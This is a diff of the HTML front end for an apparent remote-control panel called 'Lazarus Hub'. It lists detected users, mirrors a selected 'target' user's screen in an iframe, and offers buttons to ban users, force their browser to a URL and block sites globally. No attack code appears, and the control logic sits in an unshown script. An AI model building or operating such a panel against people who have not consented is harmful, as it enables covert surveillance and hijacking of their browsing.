@@ -2,50 +2,62 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Lazarus Control Center v4.0</title>
+    <title>LAZARUS HUB | Admin Central</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
-        .sidebar { width: 350px; border-right: 1px solid #00ff41; background: #0a0a0a; display: flex; flex-direction: column; }
-        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; background: #000; }
-        .monitor-frame { flex: 1; border: 2px solid #00ff41; border-radius: 12px; background: #fff; overflow: hidden; position: relative; }
-        iframe { width: 100%; height: 100%; border: none; }
+        body { background: #0a0a0c; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
         
-        .user-box { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; }
-        .user-box:hover, .user-box.active { background: #00ff41; color: #000; }
-        .btn { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #00ff41; background: none; color: #00ff41; cursor: pointer; font-weight: bold; }
+        /* SIDEBAR USUARIOS */
+        .sidebar { width: 320px; border-right: 1px solid #00ff41; background: #000; overflow-y: auto; }
+        .user-card { padding: 15px; border-bottom: 1px solid #1a1a1a; cursor: pointer; transition: 0.2s; }
+        .user-card:hover, .user-card.active { background: #00ff41; color: #000; }
+        .status-on { color: lime; font-size: 10px; }
+
+        /* MONITOR CENTRAL */
+        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; }
+        .monitor { flex: 1; border: 2px solid #00ff41; background: #fff; border-radius: 10px; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; }
+
+        /* CONTROLES */
+        .controls { width: 350px; background: #000; border-left: 1px solid #00ff41; padding: 20px; }
+        .btn { width: 100%; padding: 12px; margin-bottom: 10px; background: none; border: 1px solid #00ff41; color: #00ff41; font-weight: bold; cursor: pointer; }
         .btn:hover { background: #00ff41; color: #000; }
-        .btn-danger { border-color: red; color: red; }
-        .btn-danger:hover { background: red; color: white; }
+        .input-dark { width: 90%; background: #111; border: 1px solid #00ff41; color: lime; padding: 10px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <div style="padding: 20px; border-bottom: 2px solid #00ff41;">
-        <h2>LAZARUS v4</h2>
-        <p id="stats">Escaneando red...</p>
+    <div style="padding: 20px; border-bottom: 2px solid #00ff41; background: #050505;">
+        <h3>SISTEMA LAZARUS</h3>
+        <p>Usuarios activos detectados:</p>
     </div>
-    <div id="user-list" style="overflow-y: auto; flex: 1;"></div>
+    <div id="user-list"></div>
 </div>
 
 <div class="main">
-    <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-        <h3 id="target-name">SIN SELECCIÓN</h3>
-        <button class="btn" style="width: auto; padding: 5px 20px;" onclick="location.reload()">REFRESCAR PANEL</button>
+    <h2 id="target-title">SELECCIONE UN OBJETIVO</h2>
+    <div class="monitor">
+        <iframe id="live-screen" src="about:blank"></iframe>
     </div>
-    <div class="monitor-frame">
-        <iframe id="live-mirror" src="about:blank"></iframe>
-    </div>
-    <div style="margin-top: 15px; display: flex; gap: 20px;">
-        <div style="flex: 1;">
-            <input type="text" id="goto-url" placeholder="Forzar URL..." style="width: 100%; padding: 10px; background: #111; color: lime; border: 1px solid #333;">
-            <button class="btn" onclick="exec('GOTO')">EJECUTAR NAVEGACIÓN FORZADA</button>
-        </div>
-        <div style="flex: 1;">
-            <button class="btn btn-danger" onclick="exec('BAN')">BLOQUEO TOTAL</button>
-            <button class="btn" onclick="exec('UNBAN')">DESBLOQUEAR</button>
-        </div>
-    </div>
+</div>
+
+<div class="controls">
+    <h3>CONSOLA DE MANDO</h3>
+    <p>ID Seleccionado: <span id="id-selected" style="color:white;">Ninguno</span></p>
+    
+    <button class="btn" style="border-color: red; color: red;" onclick="exec('BAN')">BANEAR USUARIO</button>
+    <button class="btn" onclick="exec('UNBAN')">DESBANEAR</button>
+    
+    <hr>
+    <h3>CONTROL DE NAVEGACIÓN</h3>
+    <input type="text" id="force-url" class="input-dark" placeholder="URL para forzar...">
+    <button class="btn" onclick="exec('GOTO')">FORZAR SITIO WEB</button>
+    
+    <hr>
+    <h3>BLOQUEADOR DE LINKS</h3>
+    <input type="text" id="block-url" class="input-dark" placeholder="ejemplo: youtube.com">
+    <button class="btn" onclick="addBlacklist()">BLOQUEAR URL GLOBAL</button>
 </div>
 
 <script src="admin.js"></script>
